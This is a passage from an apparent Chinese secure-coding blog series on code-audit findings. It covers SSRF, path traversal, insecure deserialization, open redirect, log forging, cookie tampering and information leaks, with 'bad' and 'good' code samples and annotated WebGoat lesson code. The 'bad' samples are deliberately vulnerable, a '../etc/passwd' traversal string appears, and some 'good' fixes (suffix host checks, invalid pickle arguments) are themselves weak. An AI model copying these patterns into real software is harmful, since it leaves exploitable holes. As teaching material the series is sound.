return &quot;Invalid URL&quot;# good：检查并阻止内网IP地址from ipaddress import ip_address, ip_networkdef is_internal_ip(ip): private_networks = [ ip_network(&#x27;10.0.0.0/8&#x27;), ip_network(&#x27;172.16.0.0/12&#x27;), ip_network(&#x27;192.168.0.0/16&#x27;), ip_network(&#x27;127.0.0.1&#x27;) ] address = ip_address(ip) for network in private_networks: if address in network: return True return False@app.route(&#x27;/safe_ssrf&#x27;)def safe_test_2(): url = request.args.get(&#x27;url&#x27;) parsed_url = urlparse(url) host_ip = socket.gethostbyname(parsed_url.hostname) if not is_internal_ip(host_ip): response = requests.get(url) return response.text else: return &quot;Access Denied&quot; JavaScript代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// bad: 直接从用户输入获取URL并发起请求，没有进行URL验证app.get(&#x27;/unsafe_ssrf&#x27;, function(req, res) &#123; var url = req.query.url; request(url, function(error, response, body) &#123; res.send(body); &#125;);&#125;);// good: 限制只能访问特定域名app.get(&#x27;/safe_ssrf&#x27;, function(req, res) &#123; var url = req.query.url; var allowedHost = &quot;example.com&quot;; // 可信域名 var parsedUrl = new URL(url); if (parsedUrl.hostname.endsWith(allowedHost)) &#123; request(url, function(error, response, body) &#123; res.send(body); &#125;); &#125; else &#123; res.status(403).send(&quot;Access denied&quot;); &#125;&#125;);// good: 检查并阻止内网IP地址app.get(&#x27;/safe_ssrf&#x27;, function(req, res) &#123; var url = req.query.url; var parsedUrl = new URL(url); dns.lookup(parsedUrl.hostname, function(err, address) &#123; if (isInternalIp(address)) &#123; // 自定义函数isInternalIp需要实现IP安全检查 res.status(403).send(&quot;Access to internal resources is forbidden&quot;); &#125; else &#123; request(url, function(error, response, body) &#123; res.send(body); &#125;); &#125; &#125;);&#125;);// good: 仅允许HTTP和HTTPS请求，且限制为常用端口app.get(&#x27;/safe_ssrf&#x27;, function(req, res) &#123; var url = req.query.url; var parsedUrl = new URL(url); if ((parsedUrl.protocol === &quot;http:&quot; || parsedUrl.protocol === &quot;https:&quot;) &amp;&amp; (parsedUrl.port === &quot;80&quot; || parsedUrl.port === &quot;443&quot; || parsedUrl.port === &quot;8080&quot; || parsedUrl.port === &quot;8090&quot;)) &#123; request(url, function(error, response, body) &#123; res.send(body); &#125;); &#125; else &#123; res.status(403).send(&quot;Invalid protocol or port&quot;); &#125;&#125;); WebGoat-main&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;owasp&#x2F;webgoat&#x2F;lessons&#x2F;ssrf&#x2F;SSRFTask2.java 123456789101112131415161718192021222324252627282930313233343536373839404142/*SSRFTask2.java:47 url是污点来源SSRFTask2.java:48 污点url传入方法furBall(String)SSRFTask2.java:51 furBall(String)方法的url参数为污点SSRFTask2.java:54 服务端请求伪造类型风险触发，由入参url导致*/@RestController@AssignmentHints(&#123;&quot;ssrf.hint3&quot;&#125;)public class SSRFTask2 implements AssignmentEndpoint &#123; @PostMapping(&quot;/SSRF/task2&quot;) @ResponseBody public AttackResult completed(@RequestParam String url) &#123; return furBall(url); &#125; protected AttackResult furBall(String url) &#123; if (url.matches(&quot;http://ifconfig\\\\.pro&quot;)) &#123; String html; try (InputStream in = new URL(url).openStream()) &#123; html = new String(in.readAllBytes(), StandardCharsets.UTF_8) .replaceAll(&quot; &quot;, &quot;&lt;br&gt;&quot;); // Otherwise the gets escaped in the response &#125; catch (MalformedURLException e) &#123; return getFailedResult(e.getMessage()); &#125; catch (IOException e) &#123; // in case the external site is down, the test and lesson should still be ok html = &quot;&lt;html&gt;&lt;body&gt;Although the http://ifconfig.pro site is down, you still managed to solve&quot; + &quot; this exercise the right way!&lt;/body&gt;&lt;/html&gt;&quot;; &#125; return success(this).feedback(&quot;ssrf.success&quot;).output(html).build(); &#125; var html = &quot;&lt;img class=\\&quot;image\\&quot; alt=\\&quot;image post\\&quot; src=\\&quot;images/cat.jpg\\&quot;&gt;&quot;; return getFailedResult(html); &#125; private AttackResult getFailedResult(String errorMsg) &#123; return failed(this).feedback(&quot;ssrf.failure&quot;).output(errorMsg).build(); &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"路径穿越缺陷 - 腾讯安全代码审计实战系列05","path":"/2025/01/01/appsec/05-路径穿越缺陷/","content":"路径穿越缺陷 - 腾讯安全代码审计实战系列05在操作系统中”..”代表的是向上级目录跳转，如果程序在处理到诸如用 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 的文件名时没有进行防护，则会跳转出当前工作目录，跳转到到其他目录中；从而返回系统敏感文件给用户。其危害为泄漏源码、泄漏系统敏感文件。 修复建议 对用户输入的文件路径进行严格验证，确保其不包含路径穿越序列（例如 ‘..’）。检查并拒绝包含相对路径移动的请求。 使用文件路径白名单，只允许访问指定的安全目录和文件。 对用户输入的文件后缀进行白名单控制，仅允许安全的、预定义的文件类型。 实施路径规范化，通过函数如 Python 的 os.path.normpath() 或 Go 的 filepath.Clean() 来移除路径中的冗余序列，并验证最终文件路径是否位于预期的安全目录内。 示例代码Java代码示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081//bad：直接从请求中获取文件路径并执行删除操作，存在高风险@RequestMapping(&quot;/path/delete&quot;)public void delete(HttpServletRequest request, HttpServletResponse response) &#123; String filePath = request.getParameter(&quot;path&quot;); File file = new File(filePath); // 文件全路径由客户端传入，禁止 file.delete();&#125;//good：通过验证文件路径中是否包含非法字符来预防路径穿越@RequestMapping(&quot;/path/download&quot;)public void download(HttpServletRequest request, HttpServletResponse response) &#123; String fileName = request.getParameter(&quot;name&quot;); String DIR = &quot;/data/file/upload/&quot;; //文件服务器映射目录，非web目录 if(fileName.contains(&quot;..&quot;)) &#123; return; // 如果检测到路径穿越尝试，不执行任何操作 &#125; File file = new File(DIR + fileName); try &#123; InputStream inputStream = new FileInputStream(file); OutputStream out = response.getOutputStream(); byte[] b = new byte[100]; int len; while ((len = inputStream.read(b)) &gt; 0) &#123; out.write(b, 0, len); &#125; inputStream.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;&#125;//good：使用文件的规范路径来防止路径穿越，并确认文件位于指定目录@RequestMapping(&quot;/path/upload&quot;)public void safe_upload(@RequestParam(value=&quot;file&quot;) MultipartFile file) throws IOException &#123; String fileName = file.getOriginalFilename(); String DIR = &quot;/data/file/upload/&quot;; //文件服务器映射目录，非web目录 String filePath = DIR + fileName; File tmpFile = new File(filePath); if(!tmpFile.getCanonicalPath().startsWith(DIR)) &#123; throw new IOException(); // 如果文件路径不是以指定目录开始，抛出异常 &#125; try &#123; InputStream in = file.getInputStream(); FileUtils.copyInputStreamToFile(in, tmpFile); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;&#125;//good：结合路径检查和文件类型白名单来增强安全性@RequestMapping(&quot;/path/delete&quot;)public void safe_delete(HttpServletRequest request) &#123; String webRootPath = request.getSession().getServletContext().getRealPath(&quot;/&quot;); String fileName = request.getParameter(&quot;name&quot;); if(fileName.contains(&quot;..&quot;)) &#123; return; // 检查到路径穿越尝试，不执行操作 &#125; int pos = fileName.lastIndexOf(&quot;.&quot;); String ext = fileName.substring(pos); String whiteExt = &quot;.jpg.jpeg.png.gif.bmp&quot;; // 文件类型白名单，根据具体情况而定 if(whiteExt.contains(ext)) &#123; new File(webRootPath + fileName).delete(); &#125;&#125;//good：在上传文件时使用随机文件名并进行文件类型验证@RequestMapping(&quot;/path/upload&quot;)public void safe_upload(@RequestParam(value=&quot;file&quot;) MultipartFile file) throws IOException &#123; String fileName = file.getOriginalFilename(); String ext = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); String DIR = &quot;/data/file/upload/&quot;; //文件服务器映射目录，非web目录 String randomFileName = UUID.randomUUID().toString(); // 文件名为随机字符串 String filePath = DIR + randomFileName + ext; File tmpFile = new File(filePath); try &#123; InputStream in = file.getInputStream(); FileUtils.copyInputStreamToFile(in, tmpFile); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;&#125; Go代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940// bad: 任意文件读取func handler(w http.ResponseWriter, r *http.Request) &#123; path := r.URL.Query()[&quot;path&quot;][0] // 未过滤文件路径，可能导致任意文件读取 data, _ := ioutil.ReadFile(path) w.Write(data) // 对外部传入的文件名变量，还需要验证是否存在../等路径穿越的文件名 data, _ = ioutil.ReadFile(filepath.Join(&quot;/home/user/&quot;, path)) w.Write(data)&#125;// bad: 任意文件写入func unzip(f string) &#123; r, _ := zip.OpenReader(f) for _, f := range r.File &#123; p, _ := filepath.Abs(f.Name) // 未验证压缩文件名，可能导致../等路径穿越，任意文件路径写入 ioutil.WriteFile(p, []byte(&quot;present&quot;), 0640) &#125;&#125;// good: 检查压缩的文件名是否包含..路径穿越特征字符，防止任意写入func unzipGood(f string) bool &#123; r, err := zip.OpenReader(f) if err != nil &#123; fmt.Println(&quot;read zip file fail&quot;) return false &#125; for _, f := range r.File &#123; if !strings.Contains(f.Name, &quot;..&quot;) &#123; p, _ := filepath.Abs(f.Name) ioutil.WriteFile(p, []byte(&quot;present&quot;), 0640) &#125; else &#123; return false &#125; &#125; return true&#125; PHP代码示例： 123456789101112131415// bad：未检查文件名/路径if (isset($_GET[&#x27;filename&#x27;])) &#123; $path = &quot;/var/www/html/&quot; . $_GET[&#x27;filename&#x27;]; echo file_get_contents($path); // 危险的直接文件访问，可能导致路径穿越&#125;// good：检查了文件名/路径，是否包含路径穿越字符if (isset($_GET[&#x27;filename&#x27;])) &#123; $path = &quot;/var/www/html/&quot; . $_GET[&#x27;filename&#x27;]; if (strpos($path, &#x27;..&#x27;) === false) &#123; echo file_get_contents($path); &#125; else &#123; echo &quot;filename is not valid&quot;; &#125;&#125; Python代码示例： 123456789101112131415161718192021222324252627282930313233343536# bad: 直接使用用户输入进行文件操作，未进行路径规范化def unsafe_file_access(file_path): with open(file_path, &#x27;r&#x27;) as file: data = file.read() return data# good: 使用os.path.normpath()和白名单检查文件类型import osALLOWED_EXTENSIONS = [&#x27;txt&#x27;, &#x27;jpg&#x27;, &#x27;png&#x27;]def allowed_file(filename): # 检查文件扩展名是否合法 if (&#x27;.&#x27; in filename and &#x27;..&#x27; not in filename and os.path.splitext(filename)[1][1:].lower() in ALLOWED_EXTENSIONS): return filename return Noneupload_dir = &#x27;/tmp/upload/&#x27; # 预期的上传目录file_name = &#x27;../../etc/hosts&#x27; # 用户传入的文件名absolute_path = os.path.join(upload_dir, file_name) # 结合基础路径normalized_path = os.path.normpath(absolute_path) # 规范化路径if not normalized_path.startswith(upload_dir): # 检查最终路径是否在预期的上传目录中 raise IOError()# good: 严格控制用户可以访问的文件def secure_file_access(file_path, base_path=&#x27;/var/www/data/&#x27;): # 规范化并绝对化路径 normalized_path = os.path.normpath(os.path.join(base_path, file_path)) # 确保路径位于基础路径下 if not normalized_path.startswith(base_path): raise ValueError(&quot;Invalid file path&quot;) with open(normalized_path, &#x27;r&#x27;) as file: return file.read() JavaScript代码示例： 1234567891011121314151617181920212223242526272829303132333435const fs = require(&quot;fs&quot;);const path = require(&quot;path&quot;);// bad：直接拼接用户输入路径，没有进行校验let root = &#x27;/data/ufile&#x27;;fs.readFile(root + req.query.ufile, (err, data) =&gt; &#123; if (err) &#123; return console.error(err); &#125; console.log(`异步读取: $&#123;data.toString()&#125;`);&#125;);// bad：尽管使用了path.join，但没有完全避免路径穿越问题let filename = path.join(root, req.query.ufile);if (filename.indexOf(&quot;..&quot;) &lt; 0) &#123; fs.readFile(filename, (err, data) =&gt; &#123; if (err) &#123; return console.error(err); &#125; console.log(`File Read: $&#123;data.toString()&#125;`); &#125;);&#125;;// good：进行路径规范化并检查最终路径是否在预期目录filename = path.resolve(root, req.query.ufile);if (filename.startsWith(root)) &#123; fs.readFile(filename, (err, data) =&gt; &#123; if (err) &#123; return console.error(err); &#125; console.log(`Secure File Read: $&#123;data.toString()&#125;`); &#125;);&#125; else &#123; console.error(&#x27;Attempted path traversal&#x27;);&#125; WebGoat-main&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;owasp&#x2F;webgoat&#x2F;lessons&#x2F;xxe&#x2F;Ping.java 123456789101112131415161718192021222324252627282930/*Ping.java:44 username是污点来源Ping.java:50 路径穿越类型风险触发，由入参username导致*/@Slf4jpublic class Ping &#123; @Value(&quot;$&#123;webgoat.user.directory&#125;&quot;) private String webGoatHomeDirectory; @GetMapping @ResponseBody public String logRequest( @RequestHeader(&quot;User-Agent&quot;) String userAgent, @RequestParam(required = false) String text, @CurrentUsername String username) &#123; String logLine = String.format(&quot;%s %s %s&quot;, &quot;GET&quot;, userAgent, text); log.debug(logLine); File logFile = new File(webGoatHomeDirectory, &quot;/XXE/log&quot; + username + &quot;.txt&quot;); try &#123; try (PrintWriter pw = new PrintWriter(logFile)) &#123; pw.println(logLine); &#125; &#125; catch (FileNotFoundException e) &#123; log.error(&quot;Error occurred while writing the logfile&quot;, e); &#125; return &quot;&quot;; &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"反序列化缺陷 - 腾讯安全代码审计实战系列06","path":"/2025/01/01/appsec/06-反序列化缺陷/","content":"反序列化缺陷 - 腾讯安全代码审计实战系列06序列化是把对象转换成一种数据格式, JSON, XML等文本格式或二进制字节流格式, 便于保存在内存, 文件, 数据库中或者在网络通信中进行传输。 反序列化是序列化的逆过程, 即由保存的文本格式或字节流格式还原成对象。 当反序列化的输入可以被用户控制, 恶意用户便可以构造恶意的字节流, 经反序列化之后得到精心构造的恶意对象。 其危害如下： 拒绝服务攻击 访问控制攻击 远程命令执行攻击 修复建议 不要对来自不可信来源的数据进行反序列化。 对所有反序列化的数据进行加密签名，并确保在进行反序列化之前对数据进行验证。 为反序列化的接口添加认证与授权机制，确保只有授权的用户可以访问。 确保反序列化服务只在本地环境运行或适当配置防火墙规则以阻止未授权的远程访问。 定期更新和升级所有使用的第三方库，以利用最新的安全修补程序防止已知漏洞的利用。 示例代码Java代码示例： 123456789101112131415161718192021222324252627//bad：直接从请求中获取输入流进行反序列化，存在高风险public void unsafeDeserialization(HttpServletRequest request) &#123; try &#123; InputStream in = request.getInputStream(); ObjectInputStream ois = new ObjectInputStream(in); Object obj = ois.readObject(); // 反序列化操作 ois.close(); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125;&#125;//good：通过验证数据签名来增强安全性public void safeDeserialization(HttpServletRequest request) &#123; try &#123; InputStream in = request.getInputStream(); if (!isSignatureValid(in)) &#123; // 检查数据签名是否有效 throw new SecurityException(&quot;Invalid data signature&quot;); &#125; // 使用白名单过滤可反序列化的类 ObjectInputStream ois = new SecureObjectInputStream(in, Arrays.asList(AllowedClass1.class, AllowedClass2.class)); Object obj = ois.readObject(); ois.close(); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125;&#125; PHP代码示例： 123456789101112131415161718192021222324252627282930&lt;?php//bad：直接对来自用户输入的数据进行反序列化function unsafeDeserialization($userData) &#123; $obj = unserialize($userData); // 反序列化操作，危险 // 使用$obj做进一步处理&#125;//good：检查数据签名后才进行反序列化function safeDeserialization($userData, $signature) &#123; if (!checkSignature($userData, $signature)) &#123; // 检查数据签名是否匹配 throw new Exception(&quot;Invalid data signature&quot;); &#125; $obj = unserialize($userData); // 使用$obj做进一步处理&#125;//good：限制反序列化的类function safeDeserializationWithClassLimit($userData) &#123; $allowedClasses = [&#x27;AllowedClass1&#x27;, &#x27;AllowedClass2&#x27;]; // 允许反序列化的类列表 $obj = unserialize($userData, [&quot;allowed_classes&quot; =&gt; $allowedClasses]); // 使用$obj做进一步处理&#125;// 辅助函数：模拟检查签名function checkSignature($data, $signature) &#123; return md5($data) === $signature; // 假设使用md5进行签名处理&#125;?&gt; Python代码示例： 12345678910111213141516171819202122232425262728293031import picklefrom cryptography.fernet import Fernet#bad：直接反序列化未验证的数据def unsafe_deserialization(data): try: obj = pickle.loads(data) # 反序列化操作 except pickle.PickleError as e: print(&quot;Failed to deserialize:&quot;, e)#good：对数据进行验证后进行安全的反序列化def safe_deserialization(data, key): fernet = Fernet(key) try: # 验证并解密数据 decrypted_data = fernet.decrypt(data) # 只允许反序列化特定的安全类型 safe_globals = &#123;&#x27;__builtins__&#x27;: None&#125; obj = pickle.loads(decrypted_data, fix_imports=True, globals=safe_globals) print(&quot;Successfully deserialized object:&quot;, obj) except Exception as e: print(&quot;Failed to deserialize safely:&quot;, e)#good：使用白名单进行类过滤的反序列化def class_filter(): safe_classes = &#123;&#x27;allowed_class&#x27;: AllowedClass&#125; try: with open(&#x27;data.pkl&#x27;, &#x27;rb&#x27;) as file: obj = pickle.load(file, fix_imports=True, globals=&#123;&#x27;__builtins__&#x27;: None, &#x27;allowed_class&#x27;: AllowedClass&#125;) except Exception as e: print(&quot;Deserialization error:&quot;, e) WebGoat-main&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;owasp&#x2F;webgoat&#x2F;lessons&#x2F;deserialization&#x2F;InsecureDeserializationTask.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/*InsecureDeserializationTask.java:52 token是污点来源InsecureDeserializationTask.java:58 污点从token传递至b64tokenInsecureDeserializationTask.java:60 污点从b64token传递至oisInsecureDeserializationTask.java:63 反序列化类型风险触发，由入参ois导致*/@RestController@AssignmentHints(&#123; &quot;insecure-deserialization.hints.1&quot;, &quot;insecure-deserialization.hints.2&quot;, &quot;insecure-deserialization.hints.3&quot;&#125;)public class InsecureDeserializationTask implements AssignmentEndpoint &#123; @PostMapping(&quot;/InsecureDeserialization/task&quot;) @ResponseBody public AttackResult completed(@RequestParam String token) throws IOException &#123; String b64token; long before; long after; int delay; b64token = token.replace(&#x27;-&#x27;, &#x27;+&#x27;).replace(&#x27;_&#x27;, &#x27;/&#x27;); try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) &#123; before = System.currentTimeMillis(); Object o = ois.readObject(); if (!(o instanceof VulnerableTaskHolder)) &#123; if (o instanceof String) &#123; return failed(this).feedback(&quot;insecure-deserialization.stringobject&quot;).build(); &#125; return failed(this).feedback(&quot;insecure-deserialization.wrongobject&quot;).build(); &#125; after = System.currentTimeMillis(); &#125; catch (InvalidClassException e) &#123; return failed(this).feedback(&quot;insecure-deserialization.invalidversion&quot;).build(); &#125; catch (IllegalArgumentException e) &#123; return failed(this).feedback(&quot;insecure-deserialization.expired&quot;).build(); &#125; catch (Exception e) &#123; return failed(this).feedback(&quot;insecure-deserialization.invalidversion&quot;).build(); &#125; delay = (int) (after - before); if (delay &gt; 7000) &#123; return failed(this).build(); &#125; if (delay &lt; 3000) &#123; return failed(this).build(); &#125; return success(this).build(); &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"开放式重定向缺陷 - 腾讯安全代码审计实战系列07","path":"/2025/01/01/appsec/07-开放式重定向/","content":"开放式重定向缺陷 - 腾讯安全代码审计实战系列07通过重定向，Web应用程序能够引导用户访问同一应用程序内的不同网页或访问外部站点。应用程序利用重定向来帮助进行站点导航，有时还跟踪用户退出站点的方式。当Web应用程序将客户端重定向到攻击者可以控制的任意URL时，就会发生Open Redirect漏洞。 攻击者可能通过Open Redirect漏洞诱骗用户访问某个可信赖的站点的URL，然后将他们重定向到恶意站点。即使攻击者对目标URL进行编码，最终用户也很难注意到重定向的恶意目标，从而导致用户被欺骗。Open Redirect通常被用作网络钓鱼诈骗的一部分，攻击者可以利用这种方式来获取最终用户的敏感数据。 修复建议 禁止未经验证的用户输入数据控制重定向机制中的目标URL。 实现白名单机制，仅允许重定向到预先定义的、可信的URL路径。 在执行重定向前，对输入的URL进行严格的格式和合法性校验。 使用间接方法：创建合法URL的列表，用户只能从中选择指定。 如果合法URL列表过于庞大，则限制用于重定向用户的域名。 示例代码1234567891011121314151617181920212223242526272829// bad：直接使用不受限制的用户输入进行重定向，存在开放重定向风险public void redirectToUrl(String dest) &#123; pageContext.forward(dest); // 直接使用未经验证的URL参数&#125;// good：使用白名单校验后进行重定向public void redirectToUrlWithWhitelist(String dest) &#123; List&lt;String&gt; allowedUrls = Arrays.asList(&quot;/home&quot;, &quot;/account&quot;, &quot;/dashboard&quot;); if (allowedUrls.contains(dest)) &#123; pageContext.forward(dest); // 请求安全的URL路径 &#125; else &#123; throw new IllegalArgumentException(&quot;Unauthorized redirection attempt detected&quot;); &#125;&#125;// good：对URL进行格式和合法性校验后进行重定向public void redirectToUrlWithValidation(String dest) &#123; try &#123; URL parsedUrl = new URL(dest); String host = parsedUrl.getHost(); if (&quot;trusted.example.com&quot;.equals(host)) &#123; // 仅允许请求特定域名 pageContext.forward(parsedUrl.getPath()); &#125; else &#123; throw new IllegalArgumentException(&quot;Unauthorized redirection attempt detected&quot;); &#125; &#125; catch (MalformedURLException e) &#123; throw new IllegalArgumentException(&quot;Invalid URL format&quot;, e); &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"密钥硬编码(明文密码传输)缺陷 - 腾讯安全代码审计实战系列08","path":"/2025/01/01/appsec/08-密钥硬编码-明文密码传输/","content":"密钥硬编码(明文密码传输)缺陷 - 腾讯安全代码审计实战系列08应用程序通过未加密的通道传输明文密码，使通信数据容易受到中间人(MiTM)攻击的截取。这种不安全的做法会使用户的敏感信息，尤其是凭据信息，暴露给恶意攻击者。这通常出现在使用HTTP协议或任何未加密的通信协议传输密码的场景中。 修复建议 应用程序必须使用传输层安全(TLS)和安全套接字层(SSL)来保护客户端和服务器之间传递的所有明文密码。确保所有的敏感数据都在加密的通道上传输。 在所有传输过程中启用并强制执行TLS或SSL，以防止数据在传输中被截取或篡改。 避免使用过时或不安全的加密协议，定期更新使用的安全库以确保使用最新的安全技术。 使用强密码策略，并考虑实施多因素认证以增强用户身份验证的安全性。 示例代码123456789101112131415161718192021public class PasswordManagementExample &#123; //bad: 使用未加密的通道或不安全的方法处理密码 public bool ValidateUserBad(string username, string password) &#123; // 此处直接传递明文密码，在不安全的通道上传输 return Membership.ValidateUser(username, password); // 可能暴露在明文传输中 &#125; //good: 使用加密的通道或安全的方法来确保密码的保护 public bool ValidateUserGood(string username, string password) &#123; // 使用HTTPS确保在加密通道中安全传输密码 // 即使在内部处理，确保任何传输均使用安全方法 return SecureValidateUser(username, password); &#125; // 一个示例函数，模拟更安全的密码验证过程 private bool SecureValidateUser(string username, string password) &#123; // 此处假设所有通信均通过加密通道或进行适当的加密 return Membership.ValidateUser(username, password); &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"日志伪造缺陷 - 腾讯安全代码审计实战系列09","path":"/2025/01/01/appsec/09-日志伪造缺陷/","content":"日志伪造缺陷 - 腾讯安全代码审计实战系列09日志伪造漏洞(Log Forging)是一种通过利用不可信数据注入日志条目中的攻击。当攻击者能够将恶意输入注入到应用程序的日志文件中时，可能导致不准确的日志记录，误导性审核记录，潜在的统计偏差，甚至可能引发更严重的攻击。这可能被恶意利用来掩盖攻击者的真实操作或栽赃他人。 修复建议 永远不要在日志中直接记录未经验证或未处理的用户输入，尤其是当这些输入包含控制字符（如换行符）时。 采用白名单方法，对日志中允许的字符进行严格限制，以确保仅记录已批准的、已验证的条目。 对于需要记录的动态内容，使用服务器生成的安全标识符，替代用户提供的数据。 应用适当的日志输出编码或转义机制来处理用户输入，从而避免控制字符注入。 示例代码12345678910111213141516171819202122232425262728293031323334353637383940public class LoggerExample &#123; private Log logger; public LoggerExample() &#123; // 初始化日志记录器 logger = new Log(); &#125; // bad：直接在日志中记录未经处理的用户输入 public void LogSensitiveData(HttpSessionState Session) &#123; string userInput = (string)Session[&quot;userInput&quot;]; logger.WriteEntry(&quot;User input: &quot; + userInput); // 可能导致日志伪造 &#125; // good：描述性记录，避免记录敏感或未经处理的数据 public void LogWithoutSensitiveData() &#123; logger.WriteEntry(&quot;User input processing failed.&quot;); // 仅记录处理状态 &#125; // good：对用户输入进行验证或转义处理后再记录 public void LogWithValidationOrSanitization(HttpSessionState Session) &#123; string userInput = (string)Session[&quot;userInput&quot;]; if (IsValid(userInput)) &#123; logger.WriteEntry(&quot;Valid user input processed.&quot;); // 确保输入已经通过验证 &#125; else &#123; string sanitizedInput = Sanitize(userInput); // 转义任何潜在危险的字符 logger.WriteEntry(&quot;Invalid input received: &quot; + sanitizedInput); // 记录脱敏后的输入 &#125; &#125; private bool IsValid(string input) &#123; // 基本验证逻辑 return !string.IsNullOrWhiteSpace(input) &amp;&amp; input.All(c =&gt; Char.IsLetterOrDigit(c)); &#125; private string Sanitize(string input) &#123; // 简单的字符替换以去除换行符 return input.Replace(&quot; &quot;, &quot;_&quot;).Replace(&quot;\\r&quot;, &quot;_&quot;); &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"HTTP Cookies 篡改缺陷 - 腾讯安全代码审计实战系列10","path":"/2025/01/01/appsec/10-HTTP-Cookies篡改/","content":"HTTP Cookies 篡改缺陷 - 腾讯安全代码审计实战系列10应用程序将未经验证的输入数据置于 HTTP 响应的 Cookie 中，可以导致多种安全攻击，例如跨站请求伪造 (CSRF)、HTTP 响应拆分、跨站脚本攻击 (XSS) 和页面劫持。这些攻击利用应用程序未能验证输入数据的漏洞，将恶意内容注入响应头中，并可能危害用户的敏感信息和应用的完整性。 修复建议 对输入数据进行严格校验，确保其格式和内容符合预期。 实施严格的输出验证，防止不受控制的字符出现在 HTTP 响应头中。 使用HTTP-only和Secure标志配置Cookies，限制其访问性和传输安全性。 采用安全字符允许列表，并拒绝出现特殊字符（如 CR 和 LF）的输入数据。 定期审查和测试应用程序，以确保对新兴攻击向量的防御能力。 示例代码1234567891011121314151617181920212223242526272829303132333435363738public class CookieHandler &#123; //bad：直接从请求参数获取数据并设置为Cookie，没有进行数据验证 public void AddUnsafeCookie(HttpResponse response, string author) &#123; response.Cookies.Add(new HttpCookie(&quot;author&quot;, author)); // 漏洞：没有进行适当的验证和清理 &#125; //good：对Cookie数据进行验证，并设置HTTP-only和Secure标志 public void AddSafeCookie(HttpResponse response, string author) &#123; if (!IsValidAuthor(author)) &#123; throw new ArgumentException(&quot;Invalid author data&quot;); &#125; HttpCookie cookie = new HttpCookie(&quot;author&quot;, HttpUtility.HtmlEncode(author)) &#123; HttpOnly = true, // 限制客户端脚本访问 Secure = true // 只能通过HTTPS传输 &#125;; response.Cookies.Add(cookie); // 安全：经过有效性验证并设置安全标志 &#125; //good：使用更严格的数据清理机制 public void AddSecureCookie(HttpResponse response, string author) &#123; if (!IsValidAuthor(author)) &#123; throw new ArgumentException(&quot;Invalid author data&quot;); &#125; HttpCookie cookie = new HttpCookie(&quot;author&quot;, HttpUtility.HtmlEncode(author)) &#123; HttpOnly = true, Secure = true &#125;; response.Cookies.Add(cookie); // 安全：经过严格的验证和编码 &#125; private bool IsValidAuthor(string author) &#123; // 假设有效的作者名仅包含字母或数字字符 return !string.IsNullOrEmpty(author) &amp;&amp; !author.Any(ch =&gt; !char.IsLetterOrDigit(ch)); &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"系统信息泄露缺陷 - 腾讯安全代码审计实战系列11","path":"/2025/01/01/appsec/11-系统信息泄露/","content":"系统信息泄露缺陷 - 腾讯安全代码审计实战系列11系统信息泄露是指通过不当的输出、日志记录或错误信息暴露了敏感的系统信息，比如数据库连接字符串、栈追踪、操作系统信息等。这些信息可能被攻击者利用，导致进一步的攻击。 修复建议 避免在输出、日志和错误消息中包含敏感的系统信息。 错误消息应简洁，不暴露系统架构或实现细节。 使用安全的日志管理策略，确保敏感信息不被记录或显示。 定期审查和清理日志文件，确保其中不含敏感信息。 示例代码1234567891011121314151617181920212223// bad：在异常信息中包含敏感系统信息public void HandleException(Exception ex) &#123; string sensitiveInfo = &quot;Operating System: Windows 10&quot;; // 敏感信息 Exception newException = new Exception(sensitiveInfo, ex); // 不安全的行为，将敏感信息包含在异常中 throw newException;&#125;// good：避免在异常信息中包含敏感系统信息public void HandleException(Exception ex) &#123; string message = &quot;An error occurred during operation.&quot;; // 安全的行为，仅输出通用错误信息 Exception newException = new Exception(message, ex); throw newException;&#125;// good：不将系统敏感信息包含在异常中，通过安全的日志管理记录public void HandleException(Exception ex) &#123; LogError(ex); // 将异常记录到安全的日志管理中&#125;private void LogError(Exception ex) &#123; // 使用安全的日志框架记录错误信息 Console.WriteLine(&quot;Error logged with safe logging mechanism&quot;);&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"系统Debug信息泄露缺陷 - 腾讯安全代码审计实战系列12","path":"/2025/01/01/appsec/12-系统Debug信息泄露/","content":"系统Debug信息泄露缺陷 - 腾讯安全代码审计实战系列12将未经验证的用户输入写入Debug日志文件可能导致攻击者伪造日志条目或将恶意信息注入日志中。这种攻击方式被称为Log Forging，可能会破坏日志的完整性，掩盖攻击者的行为轨迹，甚至影响日志处理工具的正常功能。 修复建议 创建和使用一组预定义的、合法的日志条目，确保输入不会直接写入日志，尤其是用户提供的未经验证的数据。 在日志记录之前，对用户输入进行校验和清理，仅允许安全的字符集出现，例如移除换行符以及其他特定字符。 使用服务器控制的数值来记录动态内容，避免使用用户直接提供的数据。 对敏感信息进行脱敏或使用占位符代替，避免记录原始输入值。 示例代码1234567891011121314151617181920212223242526// bad：直接记录未经验证的用户输入，可能导致日志伪造攻击public class UnsafeLoggerExample &#123; private static final Log logger = LogFactory.getLog(UnsafeLoggerExample.class); public void logUserInput(String userInput) &#123; // 不安全：直接记录用户输入 logger.debug(&quot;User input: &quot; + userInput); &#125;&#125;// good：对用户输入进行验证和清理，防止日志伪造攻击public class SafeLoggerExample &#123; private static final Log logger = LogFactory.getLog(SafeLoggerExample.class); public void 